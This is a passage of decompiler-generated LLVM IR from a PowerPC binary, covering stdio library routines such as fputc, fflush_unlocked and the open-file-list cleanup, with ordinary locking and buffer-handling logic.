  %v0_1000c9c4 = call i32 @__asm_mfcr()
  %v1_1000c9cc = add i32 %arg3, 56
  store i32 %v1_1000c9cc, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_1000c9c4, i32* %r28.global-to-local, align 4
  %v1_1000c9e8 = add i32 %arg3, 52
  %v2_1000c9e8 = inttoptr i32 %v1_1000c9e8 to i32*
  %v3_1000c9e8 = load i32, i32* %v2_1000c9e8, align 4
  %v2_1000c9ec = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000c9f8 = icmp eq i32 %v3_1000c9e8, 0
  store i1 %v3_1000c9f8, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000c9f8, label %dec_label_pc_1000ca00, label %dec_label_pc_1000ca0c

dec_label_pc_1000ca00:                            ; preds = %entry
  %v4_1000ca00 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 %v1_1000c9cc)
  %v0_1000ca04 = load i32, i32* %r29.global-to-local, align 4
  store i32 268487180, i32* @lr, align 4
  %v1_1000ca08 = call i32 @pthread_mutex_lock(i32 %v0_1000ca04)
  %v0_1000ca0c.pre = load i32, i32* @r30, align 4
  %v0_1000ca10.pre = load i32, i32* @r31, align 4
  %v0_1000ca14.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000ca0c

dec_label_pc_1000ca0c:                            ; preds = %entry, %dec_label_pc_1000ca00
  %v0_1000ca14 = phi i32 [ %v0_1000c9c4, %entry ], [ %v0_1000ca14.pre, %dec_label_pc_1000ca00 ]
  %v0_1000ca10 = phi i32 [ %arg3, %entry ], [ %v0_1000ca10.pre, %dec_label_pc_1000ca00 ]
  %v0_1000ca0c = phi i32 [ %arg2, %entry ], [ %v0_1000ca0c.pre, %dec_label_pc_1000ca00 ]
  store i32 268487196, i32* @lr, align 4
  %v3_1000ca18 = inttoptr i32 %v0_1000ca14 to i8*
  %v4_1000ca18 = call i32 @__GI_fgets_unlocked(i8* %v3_1000ca18, i32 %v0_1000ca0c, i32 %v0_1000ca10)
  store i32 1, i32* @r4, align 4
  store i32 %v2_1000c9ec, i32* @r3, align 4
  %v0_1000ca28 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000ca28, label %dec_label_pc_1000ca2c, label %dec_label_pc_1000ca30

dec_label_pc_1000ca2c:                            ; preds = %dec_label_pc_1000ca0c
  store i32 268487216, i32* @lr, align 4
  %v0_1000ca2c = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000ca34.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ca30

dec_label_pc_1000ca30:                            ; preds = %dec_label_pc_1000ca0c, %dec_label_pc_1000ca2c
  %v0_1000ca34 = phi i32 [ %v4_1000ca18, %dec_label_pc_1000ca0c ], [ %v0_1000ca34.pre, %dec_label_pc_1000ca2c ]
  %v1_1000ca44 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000c9c4)
  %v9_1000ca44 = extractvalue %0 %v1_1000ca44, 7
  store i4 %v9_1000ca44, i4* @cr4, align 1
  ret i32 %v0_1000ca34

; uselistorder directives
  uselistorder i32 %v0_1000c9c4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ca30, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca0c, { 1, 0 }
}

define i32 @__GI_fputc(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v1_1000ca5c = add i32 %arg2, 56
  store i32 %v1_1000ca5c, i32* %r30.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  %v1_1000ca70 = add i32 %arg2, 52
  %v2_1000ca70 = inttoptr i32 %v1_1000ca70 to i32*
  %v3_1000ca70 = load i32, i32* %v2_1000ca70, align 4
  %v3_1000ca74 = icmp eq i32 %v3_1000ca70, 0
  br i1 %v3_1000ca74, label %dec_label_pc_1000caac, label %dec_label_pc_1000ca7c

dec_label_pc_1000ca7c:                            ; preds = %entry
  %v1_1000ca7c = add i32 %arg2, 16
  %v2_1000ca7c = inttoptr i32 %v1_1000ca7c to i32*
  %v3_1000ca7c = load i32, i32* %v2_1000ca7c, align 4
  %v1_1000ca801 = zext i8 %arg1 to i32
  store i32 %v1_1000ca801, i32* @r30, align 4
  %v1_1000ca84 = add i32 %arg2, 28
  %v2_1000ca84 = inttoptr i32 %v1_1000ca84 to i32*
  %v3_1000ca84 = load i32, i32* %v2_1000ca84, align 4
  %v2_1000ca88 = add i32 %v3_1000ca7c, 1
  store i32 %v2_1000ca88, i32* %r11.global-to-local, align 4
  %v3_1000ca8c = icmp ult i32 %v3_1000ca7c, %v3_1000ca84
  br i1 %v3_1000ca8c, label %dec_label_pc_1000ca94, label %dec_label_pc_1000caa0

dec_label_pc_1000ca94:                            ; preds = %dec_label_pc_1000ca7c
  %v4_1000ca7c = inttoptr i32 %v3_1000ca7c to i8*
  store i8 %arg1, i8* %v4_1000ca7c, align 1
  %v0_1000ca98 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000ca98, i32* %v2_1000ca7c, align 4
  br label %dec_label_pc_1000cb04

dec_label_pc_1000caa0:                            ; preds = %dec_label_pc_1000ca7c
  store i32 268487332, i32* @lr, align 4
  %v4_1000caa0 = trunc i32 %v1_1000ca5c to i8
  %v5_1000caa0 = call i32 @putc_unlocked(i8 %v4_1000caa0, i32 %v3_1000ca7c, i32 %v1_1000ca5c)
  store i32 %v5_1000caa0, i32* @r30, align 4
  br label %dec_label_pc_1000cb04

dec_label_pc_1000caac:                            ; preds = %entry
  %v2_1000cab0 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000cab8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 %v1_1000ca5c)
  %v0_1000cabc = load i32, i32* %r30.global-to-local, align 4
  store i32 268487364, i32* @lr, align 4
  %v1_1000cac0 = call i32 @pthread_mutex_lock(i32 %v0_1000cabc)
  %v0_1000cac4 = load i32, i32* @r31, align 4
  %v1_1000cac4 = add i32 %v0_1000cac4, 16
  %v2_1000cac4 = inttoptr i32 %v1_1000cac4 to i32*
  %v3_1000cac4 = load i32, i32* %v2_1000cac4, align 4
  %v1_1000cac8 = add i32 %v0_1000cac4, 28
  %v2_1000cac8 = inttoptr i32 %v1_1000cac8 to i32*
  %v3_1000cac8 = load i32, i32* %v2_1000cac8, align 4
  %v2_1000cad0 = add i32 %v3_1000cac4, 1
  store i32 %v2_1000cad0, i32* %r11.global-to-local, align 4
  %v0_1000cad4 = load i32, i32* @r29, align 4
  %v1_1000cad4 = urem i32 %v0_1000cad4, 256
  store i32 %v1_1000cad4, i32* %r30.global-to-local, align 4
  %v3_1000cad8 = icmp ult i32 %v3_1000cac4, %v3_1000cac8
  br i1 %v3_1000cad8, label %dec_label_pc_1000cae4, label %dec_label_pc_1000caf0

dec_label_pc_1000cae4:                            ; preds = %dec_label_pc_1000caac
  %v4_1000cac4 = inttoptr i32 %v3_1000cac4 to i8*
  %v1_1000cae4 = trunc i32 %v0_1000cad4 to i8
  store i8 %v1_1000cae4, i8* %v4_1000cac4, align 1
  %v0_1000cae8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cae8 = load i32, i32* @r31, align 4
  %v2_1000cae8 = add i32 %v1_1000cae8, 16
  %v3_1000cae8 = inttoptr i32 %v2_1000cae8 to i32*
  store i32 %v0_1000cae8, i32* %v3_1000cae8, align 4
  br label %dec_label_pc_1000caf8

dec_label_pc_1000caf0:                            ; preds = %dec_label_pc_1000caac
  %v1_1000cadc = trunc i32 %v0_1000cad4 to i8
  store i32 268487412, i32* @lr, align 4
  %v6_1000caf0 = call i32 @putc_unlocked(i8 %v1_1000cadc, i32 %v0_1000cac4, i32 %v3_1000cac4)
  store i32 %v6_1000caf0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000caf8

dec_label_pc_1000caf8:                            ; preds = %dec_label_pc_1000cae4, %dec_label_pc_1000caf0
  store i32 %v2_1000cab0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268487428, i32* @lr, align 4
  %v0_1000cb00 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1000cb04

dec_label_pc_1000cb04:                            ; preds = %dec_label_pc_1000caa0, %dec_label_pc_1000ca94, %dec_label_pc_1000caf8
  %v0_1000cb08 = load i32, i32* @r30, align 4
  ret i32 %v0_1000cb08

; uselistorder directives
  uselistorder i32 %v0_1000cad4, { 2, 1, 0 }
  uselistorder i32 %v3_1000cac4, { 0, 3, 1, 2 }
  uselistorder i32 %v0_1000cac4, { 1, 0, 2 }
  uselistorder i32 %v3_1000ca7c, { 0, 3, 1, 2 }
  uselistorder i32 %v1_1000ca5c, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cb04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000caf8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002ebf8.369 to i32), i32* @r29, align 4
  %v2_1000cb40 = ptrtoint i32* %stack_var_-56 to i32
  %v4_1000cb48 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002ebf8.369 to i32))
  %v0_1000cb4c = load i32, i32* @r29, align 4
  store i32 268487508, i32* @lr, align 4
  %v1_1000cb50 = call i32 @pthread_mutex_lock(i32 %v0_1000cb4c)
  %v3_1000cb58 = load i32, i32* @global_var_1002f058.370, align 4
  %v3_1000cb5c = icmp eq i32 %v3_1000cb58, 1
  br i1 %v3_1000cb5c, label %dec_label_pc_1000cb64, label %dec_label_pc_1000cc0c

dec_label_pc_1000cb64:                            ; preds = %entry
  %v3_1000cb68 = load i16*, i16** @global_var_1002f05c.371, align 4
  %v2_1000cb6c = icmp sgt i16* %v3_1000cb68, null
  br i1 %v2_1000cb6c, label %dec_label_pc_1000cb74, label %dec_label_pc_1000cc0c

dec_label_pc_1000cb74:                            ; preds = %dec_label_pc_1000cb64
  %v0_1000cb78 = load i32, i32* @r31, align 4
  %v2_1000cb80 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* @r30, align 4
  %v4_1000cb8c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1000cb78, i32 ptrtoint (i32* @global_var_1002ebe0.388 to i32))
  store i32 268487576, i32* @lr, align 4
  %v1_1000cb94 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002ebe0.388 to i32))
  %storemerge7 = load i32, i32* bitcast (i32** @global_var_1002ef98.233 to i32*), align 4
  store i32 %storemerge7, i32* @r29, align 4
  %v3_1000cbec10 = icmp eq i32 %storemerge7, 0
  %v0_1000cbf011 = load i32, i32* @r30, align 4
  br i1 %v3_1000cbec10, label %dec_label_pc_1000cbf8, label %dec_label_pc_1000cba4

dec_label_pc_1000cba4:                            ; preds = %dec_label_pc_1000cb74, %dec_label_pc_1000cbec.backedge
  %v0_1000cbf016 = phi i32 [ %v0_1000cbf0, %dec_label_pc_1000cbec.backedge ], [ %v0_1000cbf011, %dec_label_pc_1000cb74 ]
  %v3_1000cbf017.in = phi i32 [ %v0_1000cbf0, %dec_label_pc_1000cbec.backedge ], [ %v0_1000cbf011, %dec_label_pc_1000cb74 ]
  %storemerge15 = phi i32 [ %storemerge, %dec_label_pc_1000cbec.backedge ], [ %storemerge7, %dec_label_pc_1000cb74 ]
  %v1_1000cba4 = inttoptr i32 %storemerge15 to i16*
  %v2_1000cba4 = load i16, i16* %v1_1000cba4, align 2
  %v1_1000cba8 = add i32 %storemerge15, 32
  %v2_1000cba8 = inttoptr i32 %v1_1000cba8 to i32*
  %v3_1000cba8 = load i32, i32* %v2_1000cba8, align 4
  store i32 %v3_1000cba8, i32* @r31, align 4
  %v1_1000cbac = and i16 %v2_1000cba4, -32720
  %v3_1000cbb0 = icmp eq i16 %v1_1000cbac, 48
  br i1 %v3_1000cbb0, label %dec_label_pc_1000cbc0, label %dec_label_pc_1000cbb8

dec_label_pc_1000cbb8:                            ; preds = %dec_label_pc_1000cba4
  store i32 %storemerge15, i32* @r30, align 4
  br label %dec_label_pc_1000cbec.backedge

dec_label_pc_1000cbc0:                            ; preds = %dec_label_pc_1000cba4
  %v3_1000cbf017 = icmp eq i32 %v3_1000cbf017.in, 0
  br i1 %v3_1000cbf017, label %dec_label_pc_1000cbc4, label %dec_label_pc_1000cbd0

dec_label_pc_1000cbc4:                            ; preds = %dec_label_pc_1000cbc0
  store i32 %v3_1000cba8, i32* bitcast (i32** @global_var_1002ef98.233 to i32*), align 4
  br label %dec_label_pc_1000cbd4

dec_label_pc_1000cbd0:                            ; preds = %dec_label_pc_1000cbc0
  %v2_1000cbd0 = add i32 %v0_1000cbf016, 32
  %v3_1000cbd0 = inttoptr i32 %v2_1000cbd0 to i32*
  store i32 %v3_1000cba8, i32* %v3_1000cbd0, align 4
  %v0_1000cbd4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000cbd4

dec_label_pc_1000cbd4:                            ; preds = %dec_label_pc_1000cbc4, %dec_label_pc_1000cbd0
  %v0_1000cbd4 = phi i32 [ %storemerge15, %dec_label_pc_1000cbc4 ], [ %v0_1000cbd4.pre, %dec_label_pc_1000cbd0 ]
  %v1_1000cbd4 = inttoptr i32 %v0_1000cbd4 to i16*
  %v2_1000cbd4 = load i16, i16* %v1_1000cbd4, align 2
  store i32 %v0_1000cbd4, i32* @r3, align 4
  %v1_1000cbdc = and i16 %v2_1000cbd4, 8192
  %v3_1000cbdc = icmp eq i16 %v1_1000cbdc, 0
  br i1 %v3_1000cbdc, label %dec_label_pc_1000cbec.backedge, label %dec_label_pc_1000cbe4

dec_label_pc_1000cbec.backedge:                   ; preds = %dec_label_pc_1000cbd4, %dec_label_pc_1000cbb8, %dec_label_pc_1000cbe4
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_1000cbec = icmp eq i32 %storemerge, 0
  %v0_1000cbf0 = load i32, i32* @r30, align 4
  br i1 %v3_1000cbec, label %dec_label_pc_1000cbf8, label %dec_label_pc_1000cba4

dec_label_pc_1000cbe4:                            ; preds = %dec_label_pc_1000cbd4
  store i32 268487656, i32* @lr, align 4
  %v0_1000cbe4 = call i32 @free()
  br label %dec_label_pc_1000cbec.backedge

dec_label_pc_1000cbf8:                            ; preds = %dec_label_pc_1000cbec.backedge, %dec_label_pc_1000cb74
  store i32 %v2_1000cb80, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268487684, i32* @lr, align 4
  %v0_1000cc00 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000cc08 = load i32, i32* @r29, align 4
  %v4_1000cc08 = inttoptr i32 %v0_1000cc08 to i16*
  store i16* %v4_1000cc08, i16** @global_var_1002f05c.371, align 4
  %v3_1000cc14.pre = load i32, i32* @global_var_1002f058.370, align 4
  br label %dec_label_pc_1000cc0c

dec_label_pc_1000cc0c:                            ; preds = %dec_label_pc_1000cb64, %entry, %dec_label_pc_1000cbf8
  %v3_1000cc14 = phi i32 [ 1, %dec_label_pc_1000cb64 ], [ %v3_1000cb58, %entry ], [ %v3_1000cc14.pre, %dec_label_pc_1000cbf8 ]
  store i32 %v2_1000cb40, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1000cc1c = add i32 %v3_1000cc14, -1
  store i32 %v1_1000cc1c, i32* @global_var_1002f058.370, align 4
  store i32 268487720, i32* @lr, align 4
  %v0_1000cc24 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_1000cc24

; uselistorder directives
  uselistorder i32 %v0_1000cbf0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000cbd4, { 1, 0 }
  uselistorder i32 %v3_1000cba8, { 1, 0, 2 }
  uselistorder i32 %storemerge15, { 3, 2, 0, 1 }
  uselistorder i32* bitcast (i32** @global_var_1002ef98.233 to i32*), { 4, 0, 1, 2, 5, 6, 3, 7 }
  uselistorder i16** @global_var_1002f05c.371, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cc0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cbec.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cbd4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cba4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_1002ef98.233 to i32), i32* %r9.global-to-local, align 4
  %v5_1000cc4c = icmp eq i16* %arg1, bitcast (i32** @global_var_1002ef98.233 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_1000cc4c, label %dec_label_pc_1000cc70, label %dec_label_pc_1000cc64

dec_label_pc_1000cc64:                            ; preds = %entry
  %v4_1000cc64 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_1000cc64, label %dec_label_pc_1000cc70, label %dec_label_pc_1000cd9c

dec_label_pc_1000cc70:                            ; preds = %dec_label_pc_1000cc64, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32* %r9.global-to-local, align 4
  %v2_1000cc7c = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000cc90 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002ebf8.369 to i32))
  store i32 268487836, i32* @lr, align 4
  %v1_1000cc98 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002ebf8.369 to i32))
  %v3_1000cca0 = load i32, i32* @global_var_1002f058.370, align 4
  store i32 %v2_1000cc7c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1000ccb0 = add i32 %v3_1000cca0, 1
  store i32 %v1_1000ccb0, i32* %r9.global-to-local, align 4
  store i32 %v1_1000ccb0, i32* @global_var_1002f058.370, align 4
  store i32 268487872, i32* @lr, align 4
  %v0_1000ccbc = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000ccc0 = load i32, i32* @r30, align 4
  %v4_1000cccc = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1000ccc0, i32 ptrtoint (i32* @global_var_1002ebe0.388 to i32))
  store i32 268487896, i32* @lr, align 4
  %v1_1000ccd4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002ebe0.388 to i32))
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 %v2_1000cc7c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 0, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1000ccf0.412 to i32), i32* @lr, align 4
  %v0_1000ccec = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000cd8c.pr = load i32, i32* @r31, align 4
  %v3_1000cd8c3 = icmp eq i32 %v0_1000cd8c.pr, 0
  br i1 %v3_1000cd8c3, label %dec_label_pc_1000cd94, label %dec_label_pc_1000ccf4

dec_label_pc_1000ccf4:                            ; preds = %dec_label_pc_1000cc70, %dec_label_pc_1000cd88
  %v0_1000cd10 = phi i32 [ %v3_1000cd88, %dec_label_pc_1000cd88 ], [ %v0_1000cd8c.pr, %dec_label_pc_1000cc70 ]
  %v1_1000ccf4 = inttoptr i32 %v0_1000cd10 to i16*
  %v2_1000ccf4 = load i16, i16* %v1_1000ccf4, align 2
  %v3_1000ccf4 = zext i16 %v2_1000ccf4 to i32
  %v1_1000ccf8 = and i32 %v3_1000ccf4, 64
  store i32 %v1_1000ccf8, i32* %r9.global-to-local, align 4
  %v3_1000ccf8 = icmp eq i32 %v1_1000ccf8, 0
  br i1 %v3_1000ccf8, label %dec_label_pc_1000cd88, label %dec_label_pc_1000cd00

dec_label_pc_1000cd00:                            ; preds = %dec_label_pc_1000ccf4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_1000cd04 = load i32, i32* @global_var_1002ef9c.234, align 4
  %v3_1000cd08 = icmp eq i32 %v3_1000cd04, 2
  br i1 %v3_1000cd08, label %dec_label_pc_1000cd2c, label %dec_label_pc_1000cd10

dec_label_pc_1000cd10:                            ; preds = %dec_label_pc_1000cd00
  %v1_1000cd10 = add i32 %v0_1000cd10, 56
  %v0_1000cd18 = load i32, i32* @r30, align 4
  %v4_1000cd20 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1000cd18, i32 %v1_1000cd10)
  store i32 268487980, i32* @lr, align 4
  %v1_1000cd28 = call i32 @pthread_mutex_lock(i32 %v1_1000cd10)
  %v0_1000cd2c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cd2c

dec_label_pc_1000cd2c:                            ; preds = %dec_label_pc_1000cd00, %dec_label_pc_1000cd10
  %v0_1000cd40 = phi i32 [ %v0_1000cd10, %dec_label_pc_1000cd00 ], [ %v0_1000cd2c.pre, %dec_label_pc_1000cd10 ]
  %v1_1000cd2c = inttoptr i32 %v0_1000cd40 to i16*
  %v2_1000cd2c = load i16, i16* %v1_1000cd2c, align 2
  %v3_1000cd2c = zext i16 %v2_1000cd2c to i32
  %v0_1000cd30 = load i32, i32* @r27, align 4
  %v2_1000cd30 = or i32 %v0_1000cd30, %v3_1000cd2c
  %v1_1000cd34 = and i32 %v2_1000cd30, 832
  %v1_1000cd38 = xor i32 %v1_1000cd34, 320
  store i32 %v1_1000cd38, i32* %r9.global-to-local, align 4
  %v3_1000cd38 = icmp eq i32 %v1_1000cd38, 0
  br i1 %v3_1000cd38, label %dec_label_pc_1000cd40, label %dec_label_pc_1000cd6c

dec_label_pc_1000cd40:                            ; preds = %dec_label_pc_1000cd2c
  store i32 %v0_1000cd40, i32* @r3, align 4
  store i32 268488008, i32* @lr, align 4
  %v0_1000cd44 = call i32 @__stdio_wcommit()
  %v3_1000cd48 = icmp eq i32 %v0_1000cd44, 0
  br i1 %v3_1000cd48, label %dec_label_pc_1000cd58, label %dec_label_pc_1000cd50

dec_label_pc_1000cd50:                            ; preds = %dec_label_pc_1000cd40
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000cd6c

dec_label_pc_1000cd58:                            ; preds = %dec_label_pc_1000cd40
  %v0_1000cd58 = load i32, i32* @r31, align 4
  %v1_1000cd58 = inttoptr i32 %v0_1000cd58 to i16*
  %v2_1000cd58 = load i16, i16* %v1_1000cd58, align 2
  %v3_1000cd58 = zext i16 %v2_1000cd58 to i32
  %v1_1000cd5c = add i32 %v0_1000cd58, 8
  %v2_1000cd5c = inttoptr i32 %v1_1000cd5c to i32*
  %v3_1000cd5c = load i32, i32* %v2_1000cd5c, align 4
  store i32 %v3_1000cd5c, i32* %r9.global-to-local, align 4
  %v1_1000cd60 = call i32 @__asm_rlwinm(i32 %v3_1000cd58, i32 0, i32 26, i32 24)
  %v2_1000cd60 = trunc i32 %v1_1000cd60 to i16
  %v1_1000cd64 = load i32, i32* @r31, align 4
  %v2_1000cd64 = add i32 %v1_1000cd64, 28
  %v3_1000cd64 = inttoptr i32 %v2_1000cd64 to i32*
  store i32 %v3_1000cd5c, i32* %v3_1000cd64, align 4
  %v3_1000cd68 = load i32, i32* @r31, align 4
  %v4_1000cd68 = inttoptr i32 %v3_1000cd68 to i16*
  store i16 %v2_1000cd60, i16* %v4_1000cd68, align 2
  br label %dec_label_pc_1000cd6c

dec_label_pc_1000cd6c:                            ; preds = %dec_label_pc_1000cd2c, %dec_label_pc_1000cd50, %dec_label_pc_1000cd58
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_1000cd70 = load i32, i32* @global_var_1002ef9c.234, align 4
  %v3_1000cd74 = icmp eq i32 %v3_1000cd70, 2
  br i1 %v3_1000cd74, label %dec_label_pc_1000cd88, label %dec_label_pc_1000cd7c

dec_label_pc_1000cd7c:                            ; preds = %dec_label_pc_1000cd6c
  store i32 %v2_1000cc7c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268488072, i32* @lr, align 4
  %v0_1000cd84 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1000cd88

dec_label_pc_1000cd88:                            ; preds = %dec_label_pc_1000cd6c, %dec_label_pc_1000ccf4, %dec_label_pc_1000cd7c
  %v0_1000cd88 = load i32, i32* @r31, align 4
  %v1_1000cd88 = add i32 %v0_1000cd88, 32
  %v2_1000cd88 = inttoptr i32 %v1_1000cd88 to i32*
  %v3_1000cd88 = load i32, i32* %v2_1000cd88, align 4
  store i32 %v3_1000cd88, i32* @r31, align 4
  %v3_1000cd8c = icmp eq i32 %v3_1000cd88, 0
  br i1 %v3_1000cd8c, label %dec_label_pc_1000cd94, label %dec_label_pc_1000ccf4

dec_label_pc_1000cd94:                            ; preds = %dec_label_pc_1000cd88, %dec_label_pc_1000cc70
  store i32 ptrtoint (i32* @global_var_1000cd98.413 to i32), i32* @lr, align 4
  %v0_1000cd94 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_1000cdd4

dec_label_pc_1000cd9c:                            ; preds = %dec_label_pc_1000cc64
  %v3_1000cd9c = load i16, i16* %arg1, align 2
  %v4_1000cd9c = zext i16 %v3_1000cd9c to i32
  store i32 0, i32* @r28, align 4
  %v1_1000cda4 = and i32 %v4_1000cd9c, 64
  store i32 %v1_1000cda4, i32* %r9.global-to-local, align 4
  %v3_1000cda4 = icmp eq i32 %v1_1000cda4, 0
  br i1 %v3_1000cda4, label %dec_label_pc_1000cdd4, label %dec_label_pc_1000cdac

dec_label_pc_1000cdac:                            ; preds = %dec_label_pc_1000cd9c
  store i32 268488112, i32* @lr, align 4
  %v0_1000cdac = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_1000cdb4 = icmp eq i32 %v0_1000cdac, 0
  br i1 %v3_1000cdb4, label %dec_label_pc_1000cdbc, label %dec_label_pc_1000cdd4

dec_label_pc_1000cdbc:                            ; preds = %dec_label_pc_1000cdac
  %v0_1000cdbc = load i32, i32* @r29, align 4
  %v1_1000cdbc = inttoptr i32 %v0_1000cdbc to i16*
  %v2_1000cdbc = load i16, i16* %v1_1000cdbc, align 2
  %v3_1000cdbc = zext i16 %v2_1000cdbc to i32
  store i32 0, i32* @r28, align 4
  %v1_1000cdc4 = add i32 %v0_1000cdbc, 8
  %v2_1000cdc4 = inttoptr i32 %v1_1000cdc4 to i32*
  %v3_1000cdc4 = load i32, i32* %v2_1000cdc4, align 4
  store i32 %v3_1000cdc4, i32* %r9.global-to-local, align 4
  %v1_1000cdc8 = call i32 @__asm_rlwinm(i32 %v3_1000cdbc, i32 0, i32 26, i32 24)
  %v2_1000cdc8 = trunc i32 %v1_1000cdc8 to i16
  %v3_1000cdcc = load i32, i32* @r29, align 4
  %v4_1000cdcc = inttoptr i32 %v3_1000cdcc to i16*
  store i16 %v2_1000cdc8, i16* %v4_1000cdcc, align 2
  %v0_1000cdd0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cdd0 = load i32, i32* @r29, align 4
  %v2_1000cdd0 = add i32 %v1_1000cdd0, 28
  %v3_1000cdd0 = inttoptr i32 %v2_1000cdd0 to i32*
  store i32 %v0_1000cdd0, i32* %v3_1000cdd0, align 4
  br label %dec_label_pc_1000cdd4

dec_label_pc_1000cdd4:                            ; preds = %dec_label_pc_1000cdac, %dec_label_pc_1000cd9c, %dec_label_pc_1000cd94, %dec_label_pc_1000cdbc
  %v0_1000cdd8 = load i32, i32* @r28, align 4
  ret i32 %v0_1000cdd8

; uselistorder directives
  uselistorder i32 %v3_1000cd88, { 1, 2, 0 }
  uselistorder i32 %v1_1000cd38, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* @global_var_1002f058.370, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_1002ebf8.369 to i32), { 0, 3, 2, 5, 6, 1, 4, 7, 8 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000cdd4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000cd88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cd6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cd2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccf4, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
